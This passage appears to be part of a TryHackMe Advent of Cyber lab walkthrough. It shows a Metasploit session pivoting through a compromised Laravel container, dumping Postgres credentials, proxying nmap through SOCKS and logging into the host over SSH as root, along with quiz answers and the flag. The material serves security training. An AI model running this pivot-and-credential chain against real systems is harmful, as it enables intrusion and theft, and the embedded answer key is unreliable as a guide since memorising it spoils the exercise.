@@ -5143,3 +5143,1718 @@ Mode              Size  Type  Last modified              Name
 040755/rwxr-xr-x  340   dir   2022-12-18 21:33:25 -0500  dev
 040755/rwxr-xr-x  4096  dir   2022-09-13 15:39:42 -0400  etc
 040755/rwxr-xr-x  4096  dir   2022-09-03 08:10:00 -0400  home
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:45:24 -0400  lib
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  lib64
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  media
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  mnt
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  opt
+040555/r-xr-xr-x  0     dir   2022-12-18 21:33:24 -0500  proc
+040700/rwx------  4096  dir   2022-09-13 13:03:40 -0400  root
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:48:53 -0400  run
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:48:51 -0400  sbin
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  srv
+040555/r-xr-xr-x  0     dir   2022-12-18 21:33:25 -0500  sys
+041777/rwxrwxrwx  4096  dir   2022-12-18 22:55:36 -0500  tmp
+040755/rwxr-xr-x  4096  dir   2022-09-11 20:00:00 -0400  usr
+040755/rwxr-xr-x  4096  dir   2022-09-13 05:45:28 -0400  var
+```
+```text
+meterpreter > cd root
+[-] stdapi_fs_chdir: Operation failed: 13
+```
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.17.0.1         255.255.255.255    Session 3
+   172.28.101.51      255.255.255.255    Session 3
+
+[*] There are currently no IPv6 routes defined.
+```
+*/.dockerenv*
+What file often contains useful credentials for web applications?
+*.env*
+What database table contains useful credentials?
+```text
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > use auxiliary/scanner/postgres/postgres_schemadump
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > run postgres://postgres:postgres@172.28.101.51/postgres
+
+[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
+[+] Postgres SQL Server Schema 
+ Host: 172.28.101.51 
+ Port: 5432 
+ ====================
+
+---
+- DBName: postgres
+  Tables:
+  - TableName: users_id_seq
+    Columns:
+    - ColumnName: last_value
+      ColumnType: int8
+      ColumnLength: '8'
+    - ColumnName: log_cnt
+      ColumnType: int8
+      ColumnLength: '8'
+    - ColumnName: is_called
+      ColumnType: bool
+      ColumnLength: '1'
+  - TableName: users
+    Columns:
+    - ColumnName: id
+      ColumnType: int4
+      ColumnLength: '4'
+    - ColumnName: username
+      ColumnType: varchar
+      ColumnLength: "-1"
+    - ColumnName: password
+      ColumnType: varchar
+      ColumnLength: "-1"
+    - ColumnName: created_at
+      ColumnType: timestamp
+      ColumnLength: '8'
+    - ColumnName: deleted_at
+      ColumnType: timestamp
+      ColumnLength: '8'
+  - TableName: users_pkey
+    Columns:
+    - ColumnName: id
+      ColumnType: int4
+      ColumnLength: '4'
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > use auxiliary/admin/postgres/postgres_sql
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_sql) > run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
+[*] Running module against 172.28.101.51
+
+Query Text: 'select * from users'
+=================================
+
+    id  username  password  created_at                  deleted_at
+    --  --------  --------  ----------                  ----------
+    1   santa     p4$$w0rd  .669279  NIL
+
+[*] Auxiliary module execution completed
+```
+*users*
+What is Santa's password?
+*p4$$w0rd*
+What ports are open on the host machine?
+List the ports in order.
+```text
+msf6 auxiliary(server/socks_proxy) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.19.103:4444 -> 10.10.117.
+                                                             214:60622 (10.10.117.214)
+  3         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.19.103:4433 -> 10.10.117.
+                                                             214:33316 (172.28.101.50)
+```
+```text
+msf6 auxiliary(server/socks_proxy) > use auxiliary/server/socks_proxy
+```
+```text
+msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
+[*] Auxiliary module running as background job 2.
+
+[*] Starting the SOCKS proxy server
+
+┌──(root㉿kali)-[~]
+└─# curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v
+- Trying 127.0.0.1:9050...
+- SOCKS4 communication to 172.17.0.1:80
+- SOCKS4a request granted.
+- Connected to localhost (127.0.0.1) port 9050 (#0)
+> GET / HTTP/1.1
+> Host: 172.17.0.1
+> User-Agent: curl/7.85.0
+> Accept: */*
+> 
+- Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Mon, 19 Dec 2022 05:57:00 GMT
+< Server: Apache/2.4.54 (Debian)
+< X-Powered-By: PHP/7.4.30
+< Cache-Control: no-cache, private
+< Set-Cookie: XSRF-TOKEN=eyJpdiI6ImZIN3d6L3Q2Nlpobkx5Wmloa0gzb2c9PSIsInZhbHVlIjoiak9Zc1RVQjRSdmJUQWMxTGtrYWkveHBlRjJieHhSV251QmVVaU13R1drckl5cHdra2xvZ2pXUmtHK1IzK2ZTTkhNa28zWjBOaEZCdlJXb2d3dFZRV1g1aWxDZzRQUlpPNVZ2TUNoSk5SVWdiYXg1TFlDY1k1eWUwekdhLzYrMFQiLCJtYWMiOiI1MDg3MjFiZWJmNDZlY2U0ZDc1MDYwNTI4MGJkZWY0ZGYxZGI3OWVmYjdkYzBmZWRkYmNlNDAyYWM0NmQ3ZTlhIn0%3D; expires=Mon, 19-Dec-2022 07:57:01 GMT; Max-Age=7200; path=/; samesite=lax
+< Set-Cookie: laravel_session=eyJpdiI6InVnMEY2bXJZdGZ3N0t6eVAwM2ZOelE9PSIsInZhbHVlIjoiTEhEVzE1TjFWeWt6UEtmekFxejhtOUZmcllpYlpRV2JzYmVTYitaZktud0xjbzUyaHFINXpxWm85MHo5aVRxNks0MXd0OVVodm1MakNCLzlzTVhaWjlyeWFuSE9RUGgzejFhalpoQU0zMjdjRHo5MkVsQXpscnRPbGg4VS9XUWsiLCJtYWMiOiI5OGVjMGE1NGE1OWFhODBlODI3ZDkwYWRhMGNiMzI2ZWM5ZWQ0OGFkZTZjN2ZmYTdiMmUwZWZlYzliMjMyZmYyIn0%3D; expires=Mon, 19-Dec-2022 07:57:01 GMT; Max-Age=7200; path=/; httponly; samesite=lax
+< Vary: Accept-Encoding
+< Transfer-Encoding: chunked
+< Content-Type: text/html; charset=UTF-8
+< 
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <title>Curabitur aliquet, libero id suscipit semper</title>
+
+        <!-- Fonts -->
+        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+
+        <!-- Styles -->
+        <style>
+            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}[hidden]{display:none}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}a{color:inherit;text-decoration:inherit}svg,video{display:block;vertical-align:middle}video{max-width:100%;height:auto}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.border-gray-200{--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))}.border-t{border-top-width:1px}.flex{display:flex}.grid{display:grid}.hidden{display:none}.items-center{align-items:center}.justify-center{justify-content:center}.font-semibold{font-weight:600}.h-5{height:1.25rem}.h-8{height:2rem}.h-16{height:4rem}.text-sm{font-size:.875rem}.text-lg{font-size:1.125rem}.leading-7{line-height:1.75rem}.mx-auto{margin-left:auto;margin-right:auto}.ml-1{margin-left:.25rem}.mt-2{margin-top:.5rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.ml-4{margin-left:1rem}.mt-8{margin-top:2rem}.ml-12{margin-left:3rem}.-mt-px{margin-top:-1px}.max-w-6xl{max-width:72rem}.min-h-screen{min-height:100vh}.overflow-hidden{overflow:hidden}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-8{padding-top:2rem}.fixed{position:fixed}.relative{position:relative}.top-0{top:0}.right-0{right:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.text-center{text-align:center}.text-gray-200{--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#303C42;color:rgba(160,174,192,var(--text-opacity))}.text-gray-600{--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.underline{text-decoration:underline}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.w-5{width:1.25rem}.w-8{width:2rem}.w-auto{width:auto}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}@media (min-width:640px){.sm\:rounded-lg{border-radius:.5rem}.sm\:block{display:block}.sm\:items-center{align-items:center}.sm\:justify-start{justify-content:flex-start}.sm\:justify-between{justify-content:space-between}.sm\:h-20{height:5rem}.sm\:ml-0{margin-left:0}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-0{padding-top:0}.sm\:text-left{text-align:left}.sm\:text-right{text-align:right}}@media (min-width:768px){.md\:border-t-0{border-top-width:0}.md\:border-l{border-left-width:1px}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}}@media (prefers-color-scheme:dark){.dark\:bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.dark\:bg-gray-900{--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))}.dark\:border-gray-700{--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))}.dark\:text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.dark\:text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}}
+        </style>
+
+        <style>
+            body {
+                font-family: 'Nunito';
+            }
+        </style>
+    </head>
+    <body class="antialiased">
+        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0">
+            <div class="max-w-6xl mx-auto sm:px-6 lg:px-8">
+                <div class="mt-8 bg-white dark:bg-gray-800 overflow-hidden shadow sm:rounded-lg">
+                    <div class="grid grid-cols-1 md:grid-cols-1">
+                        <div class="p-6">
+                            <div class="flex items-center">
+                                <svg style="enable-background:new 0 0 24 24;" version="1.1" viewBox="0 0 24 24" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="w-8 h-8 text-gray-500"><title/><g><circle cx="11.5" cy="8" r="0.5" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><circle cx="14" cy="13" r="0.5" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><circle cx="10" cy="17" r="0.5" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><circle cx="15" cy="18" r="0.5" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><path d="M10.44,20.5   c-0.087,1.145-0.601,2.216-1.44,3h6c-0.839-0.784-1.353-1.855-1.44-3H10.44z" id="_Path_" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><polyline points="10.44,5.21 6.5,9.5 9.5,9.5 5,15    8,15 3.5,20.5 20.5,20.5 16,15 19,15 14.5,9.5 17.5,9.5 13.56,5.21  " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><polygon points="12,0.5 12.8,2.13 14.71,2.53    13.3,3.65 13.6,5.44 12,4.59 10.4,5.44 10.7,3.65 9.29,2.53 11.2,2.13  " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/></g></svg>
+                                <div class="ml-4 text-lg leading-7 font-semibold"><a href="#" class="underline text-gray-900 dark:text-white">Interdum et malesuada</a></div>
+                            </div>
+
+                            <div class="ml-12">
+                                <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
+                                   Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non erat mollis, sodales erat id, maximus risus. Nulla eget convallis nulla. Nulla feugiat massa id orci rhoncus, sed vestibulum tellus tempus. Phasellus vel dolor quis augue porttitor auctor et ac augue. Vestibulum fermentum orci dui, vel porttitor tellus viverra ut. Etiam lobortis augue mauris, at condimentum velit interdum vitae. Cras accumsan quis felis id ultrices.
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="p-6 border-t border-gray-200 dark:border-gray-700 md:border-t-0 md:border-l">
+                            <div class="flex items-center">
+                                <svg style="enable-background:new 0 0 24 24;" class="w-8 h-8 text-gray-500" version="1.1" viewBox="0 0 24 24" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title/><g id="Present_Box_1"><g><polyline points="21.5,7.5 21.5,22.5 2.5,22.5     2.5,7.5   " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><line style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;" x1="10.18" x2="13.94" y1="3.5" y2="3.5"/><g><circle cx="12" cy="5" r="1.5" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><path d="M10.81,4.08C9.34,2.61,7.22,1.5,6,1.5     s-0.5,2.16-0.5,3s-0.19,3,1,3S10.86,6,10.86,6" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><path d="M13.22,4.16C14.69,2.69,16.78,1.5,18,1.5     s0.5,2.16,0.5,3s0.19,3-1,3s-4.27-1.59-4.27-1.59" style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><polyline points="9.67,6.5 8.5,9.5 10,9      10.5,10.5 12,6.5    " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><polyline points="14.38,6.45 15.5,9.5 14,9      13.5,10.5 12,6.5    " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/></g><line style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;" x1="13.5" x2="13.5" y1="22.5" y2="10.5"/><line style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;" x1="10.5" x2="10.5" y1="10.5" y2="22.5"/><g><polygon points="11.63,7.5 12.38,7.5 12,6.5         " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><polyline points="14.75,7.5 22.5,7.5 22.5,3.5      18.62,3.5    " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/><polyline points="5.38,3.5 1.5,3.5 1.5,7.5      9.25,7.5    " style="fill:none;stroke:#303C42;stroke-linecap:round;stroke-linejoin:round;"/></g></g></g></svg>
+                                <div class="ml-4 text-lg leading-7 font-semibold"><a href="#" class="underline text-gray-900 dark:text-white">Nulla pretium</a></div>
+                            </div>
+
+                            <div class="ml-12">
+                                <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
+                                    Interdum et malesuada fames ac ante ipsum primis in faucibus. Donec non massa et nibh sodales sollicitudin sit amet vel purus. Aliquam ex lectus, viverra sed felis non, dignissim imperdiet augue. Mauris justo augue, iaculis placerat rhoncus eget, finibus nec ipsum. Aliquam eget ultricies erat. Quisque id posuere elit. Sed consectetur, ipsum quis dapibus interdum, dui dolor tincidunt libero, iaculis dignissim velit orci ac ipsum. Etiam malesuada lacinia imperdiet. Ut quis commodo ante.
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="p-6 border-t border-gray-200 dark:border-gray-700">
+                            <div class="flex items-center">
+                                <svg style="enable-background:new 0 0 24 24; fill: #303C42" class="w-8 h-8 text-gray-500" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><g><path d="M273.417,135.8151a31.7578,31.7578,0,0,1,3.6848-3.1578L255.867,53.4167A114.4362,114.4362,0,0,0,216.7309,79.129a40.0831,40.0831,0,0,0,56.6861,56.6861Z"/><path d="M311.9362,128.27,369.8521,70.354a114.8449,114.8449,0,0,0-88.5384-23.69L302.4628,125.81A35.8738,35.8738,0,0,1,311.9362,128.27Z"/><path d="M110.3768,398.1011a40.1135,40.1135,0,0,0,56.6862,56.7718l28.9558-28.9558L139.3326,369.231Z"/><rect height="80.2285" transform="translate(-189.4802 252.2719) rotate(-44.9567)" width="67.3855" x="176.4119" y="314.9891"/><polygon points="224.186 284.292 280.877 341.064 328.612 293.328 271.836 236.642 224.186 284.292"/><path d="M323.0849,185.393,290.44,218.0379l56.7762,56.6862,32.5549-32.555a113.7419,113.7419,0,0,0,25.6223-39.1361l-79.1507-21.2348A39.9053,39.9053,0,0,1,323.0849,185.393Z"/><path d="M388.5461,88.958,330.54,146.96A34.6811,34.6811,0,0,1,333,156.2616L412.15,177.4964A115.1576,115.1576,0,0,0,388.5461,88.958Z"/></g></svg>
+                                <div class="ml-4 text-lg leading-7 font-semibold"><a href="#" class="underline text-gray-900 dark:text-white">Curabitur porttitor</a></div>
+                            </div>
+
+                            <div class="ml-12">
+                                <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
+                                    Morbi vestibulum sapien in libero ullamcorper venenatis et feugiat orci. Nunc convallis facilisis purus, at fringilla elit. Aliquam a auctor augue, id volutpat risus. Aliquam consequat risus ut lectus malesuada pharetra. Curabitur aliquet, libero id suscipit semper, nisi sem blandit enim, et ullamcorper felis nisl sed urna. Nullam fermentum libero eget auctor tincidunt. Maecenas pharetra nunc quis mi varius, ac suscipit purus interdum. Maecenas gravida, nulla a viverra tincidunt, augue sapien vulputate lorem, sed imperdiet arcu nibh non felis. Nunc posuere nulla vitae urna mollis, at venenatis odio malesuada.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex justify-center mt-4 sm:items-center sm:justify-between">
+                    <div class="text-center text-sm text-gray-500 sm:text-left">
+                        <div class="flex items-center">
+                        </div>
+                    </div>
+
+                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
+                        Laravel v8.26.1 (PHP v7.4.30)
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
+- Connection #0 to host localhost left intact
+
+┌──(root㉿kali)-[~]
+└─# proxychains -h
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+proxychains: can't load process '-h'. (hint: it's probably a typo): No such file or directory
+                                                                                         
+┌──(root㉿kali)-[~]
+└─# more /etc/proxychains4.conf
+```
+```text
+# proxychains.conf  VER 4.x
+#
+```
+```text
+#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.
+```
+```text
+# The option below identifies how the ProxyList is treated.
+```
+```text
+# only one option should be uncommented at time,
+```
+```text
+# otherwise the last appearing option will be accepted
+#
+#dynamic_chain
+#
+```
+```text
+# Dynamic - Each connection will be done via chained proxies
+```
+```text
+# all proxies chained in the order as they appear in the list
+```
+```text
+# at least one proxy must be online to play in chain
+```
+```text
+# (dead proxies are skipped)
+```
+```text
+# otherwise EINTR is returned to the app
+#
+strict_chain
+#
+```
+```text
+# Strict - Each connection will be done via chained proxies
+```
+```text
+# all proxies chained in the order as they appear in the list
+```
+```text
+# all proxies must be online to play in chain
+```
+```text
+# otherwise EINTR is returned to the app
+#
+#round_robin_chain
+#
+```
+```text
+# Round Robin - Each connection will be done via chained proxies
+```
+```text
+# of chain_len length
+```
+```text
+# all proxies chained in the order as they appear in the list
+```
+```text
+# at least one proxy must be online to play in chain
+```
+```text
+# (dead proxies are skipped).
+```
+```text
+# the start of the current proxy chain is the proxy after the last
+```
+```text
+# proxy in the previously invoked proxy chain.
+```
+```text
+# if the end of the proxy chain is reached while looking for proxies
+```
+```text
+# start at the beginning again.
+```
+```text
+# otherwise EINTR is returned to the app
+```
+```text
+# These semantics are not guaranteed in a multithreaded environment.
+#
+#random_chain
+#
+```
+```text
+# Random - Each connection will be done via random proxy
+```
+```text
+# (or proxy chain, see  chain_len) from the list.
+```
+```text
+# this option is good to test your IDS :)
+```
+```text
+# Make sense only if random_chain or round_robin_chain
+#chain_len = 2
+```
+```text
+# Quiet mode (no output from library)
+#quiet_mode
+
+## Proxy DNS requests - no leak for DNS data
+```
+```text
+# (disable all of the 3 items below to not proxy your DNS requests)
+```
+```text
+# method 1. this uses the proxychains4 style method to do remote dns:
+```
+```text
+# a thread is spawned that serves DNS requests and hands down an ip
+```
+```text
+# assigned from an internal list (via remote_dns_subnet).
+```
+```text
+# this is the easiest (setup-wise) and fastest method, however on
+```
+```text
+# systems with buggy libcs and very complex software like webbrowsers
+```
+```text
+# this might not work and/or cause crashes.
+proxy_dns
+```
+```text
+# method 2. use the old proxyresolv script to proxy DNS requests
+```
+```text
+# in proxychains 3.1 style. requires `proxyresolv` in $PATH
+```
+```text
+# plus a dynamically linked `dig` binary.
+```
+```text
+# this is a lot slower than `proxy_dns`, doesn't support .onion URLs,
+```
+```text
+# but might be more compatible with complex software like webbrowsers.
+#proxy_dns_old
+```
+```text
+# method 3. use proxychains4-daemon process to serve remote DNS requests.
+```
+```text
+# this is similar to the threaded `proxy_dns` method, however it requires
+```
+```text
+# that proxychains4-daemon is already running on the specified address.
+```
+```text
+# on the plus side it doesn't do malloc/threads so it should be quite
+```
+```text
+# compatible with complex, async-unsafe software.
+```
+```text
+# note that if you don't start proxychains4-daemon before using this,
+```
+```text
+# the process will simply hang.
+#proxy_dns_daemon 127.0.0.1:1053
+```
+```text
+# set the class A subnet number to use for the internal remote DNS mapping
+```
+```text
+# we use the reserved 224.x.x.x range by default,
+```
+```text
+# if the proxified app does a DNS request, we will return an IP from that range.
+```
+```text
+# on further accesses to this ip we will send the saved DNS name to the proxy.
+```
+```text
+# in case some control-freak app checks the returned ip, and denies to
+```
+```text
+# connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.
+```
+```text
+# of course you should make sure that the proxified app does not need
+```
+```text
+# *real* access to this subnet.
+```
+```text
+# i.e. dont use the same subnet then in the localnet section
+#remote_dns_subnet 127 
+#remote_dns_subnet 10
+remote_dns_subnet 224
+```
+```text
+# Some timeouts in milliseconds
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+### Examples for localnet exclusion
+## localnet ranges will *not* use a proxy to connect.
+## note that localnet works only when plain IP addresses are passed to the app,
+## the hostname resolves via /etc/hosts, or proxy_dns is disabled or proxy_dns_old used.
+
+## Exclude connections to 192.168.1.0/24 with port 80
+```
+```text
+# localnet 192.168.1.0:80/255.255.255.0
+
+## Exclude connections to 192.168.100.0/24
+```
+```text
+# localnet 192.168.100.0/255.255.255.0
+
+## Exclude connections to ANYwhere with port 80
+```
+```text
+# localnet 0.0.0.0:80/0.0.0.0
+```
+```text
+# localnet [::]:80/0
+
+## RFC6890 Loopback address range
+## if you enable this, you have to make sure remote_dns_subnet is not 127
+## you'll need to enable it if you want to use an application that 
+## connects to localhost.
+```
+```text
+# localnet 127.0.0.0/255.0.0.0
+```
+```text
+# localnet ::1/128
+
+## RFC1918 Private Address Ranges
+```
+```text
+# localnet 10.0.0.0/255.0.0.0
+```
+```text
+# localnet 172.16.0.0/255.240.0.0
+```
+```text
+# localnet 192.168.0.0/255.255.0.0
+
+### Examples for dnat
+## Trying to proxy connections to destinations which are dnatted,
+## will result in proxying connections to the new given destinations.
+## Whenever I connect to 1.1.1.1 on port 1234 actually connect to 1.1.1.2 on port 443
+```
+```text
+# dnat 1.1.1.1:1234  1.1.1.2:443
+
+## Whenever I connect to 1.1.1.1 on port 443 actually connect to 1.1.1.2 on port 443
+## (no need to write :443 again)
+```
+```text
+# dnat 1.1.1.2:443  1.1.1.2
+
+## No matter what port I connect to on 1.1.1.1 port actually connect to 1.1.1.2 on port 4
+43
+```
+```text
+# dnat 1.1.1.1  1.1.1.2:443
+
+## Always, instead of connecting to 1.1.1.1, connect to 1.1.1.2
+```
+```text
+# dnat 1.1.1.1  1.1.1.2
+```
+```text
+# ProxyList format
+```
+```text
+#       type  ip  port [user pass]
+```
+```text
+#       (values separated by 'tab' or 'blank')
+#
+```
+```text
+#       only numeric ipv4 addresses are valid
+#
+#
+```
+```text
+#        Examples:
+#
+```
+```text
+#               socks5  192.168.67.78   1080    lamer   secret
+```
+```text
+#               http    192.168.89.3    8080    justu   hidden
+```
+```text
+#               socks4  192.168.1.49    1080
+```
+```text
+#               http    192.168.39.93   8080
+#
+#
+```
+```text
+#       proxy types: http, socks4, socks5, raw
+```
+```text
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+```
+```text
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+```
+```text
+# add proxy here ...
+```
+```text
+# meanwile
+```
+```text
+# defaults set to "tor"
+socks4  127.0.0.1 9050
+
+┌──(root㉿kali)-[~]
+└─# proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
+Starting Nmap 7.93 ( https://nmap.org )
+Nmap scan report for 172.17.0.1
+Host is up (0.0033s latency).
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  closed https
+5432/tcp closed postgresql
+
+Nmap done: 1 IP address (1 host up) scanned in 10.18 seconds
+```
+```text
+msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
+```
+```text
+msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa:p4$$w0rd@172.17.0.1
+[*] 172.17.0.1:22 - Starting bruteforce
+[+] 172.17.0.1:22 - Success: 'santa:p4$$w0rd' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 3 opened (10.8.19.103-10.10.117.214:37598 -> 172.17.0.1:22) 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+```text
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.19.103:4444 -> 10.10.117.
+                                                             214:60654 (10.10.117.214)
+  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.19.103:4433 -> 10.10.117.
+                                                             214:33346 (172.28.101.50)
+  3         shell linux            SSH kali @                10.8.19.103-10.10.117.214:3759
+                                                             8 -> 172.17.0.1:22 (172.17.0.1
+                                                             )
+```
+```text
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 3
+[*] Starting interaction with 3...
+
+mesg: ttyname failed: Inappropriate ioctl for device
+whoami
+root
+ls /root 
+root.txt
+cat /root/root.txt
+THM{47C61A0FA8738BA77308A8A600F88E4B}
+```
+*22,80*
+What is the root flag?
+Day 9 is done! You might want to take a well-deserved rest now. If this challenge was right up your alley, though, we think you might enjoy the [Compromising Active Directory](https://tryhackme.com/module/hacking-active-directory) module!
+### [Day 10] Hack a game You're a mean one, Mr. Yeti
+The Story
+Check out Alh4zr3d's video walkthrough for Day 10 [here](https://www.youtube.com/watch?v=_ej3yMF31zg)!
+Santa's team have done well so far. The elves, blue and red combined, have been securing everything technological all around. The Bandit Yeti, unable to hack a thing, decided to go for eldritch magic as a last resort and trapped Elf McSkidy in a video game during her sleep. When the rest of the elves woke up, their leader was nowhere to be found until Elf Recon McRed noticed one of their screens, where Elf McSkidy's pixelated figure could be seen. By the screen, an icy note read: **"Only by winning the unwinnable game shall your dear Elf McSkidy be reclaimed"**.
+Without their chief, the elves started running in despair. How could they run a SOC without its head? The game was rigged, and try after try, the elves would lose, no matter what. As struck by lightning, Elf Exploit McRed stood up from his chair and said to the others: **"If we can't win it, we'll hack it!"**.
+Learning Objectives
+-   Learn how data is stored in memory in games or other applications.
+-   Use simple tools to find and alter data in memory.
+-   Explore the effects of changing data in memory on a running game.
+The Memory of a Program
+Whenever we execute a program, all data will be processed somehow through the computer's RAM (Random Access Memory). If you think of a videogame, your HP, position, movement speed and direction are all stored somewhere in memory and updated as needed as the game goes.
+If you can modify the relevant memory positions, you could trick the game into thinking you have more HP than you should or even a higher score! This sounds relatively easy, but a program's memory space is vast and sparse, and finding the location where these variables are stored is nothing you'd want to do by hand. Hopefully, some tools will help us navigate memory and find where all the juicy information is at.
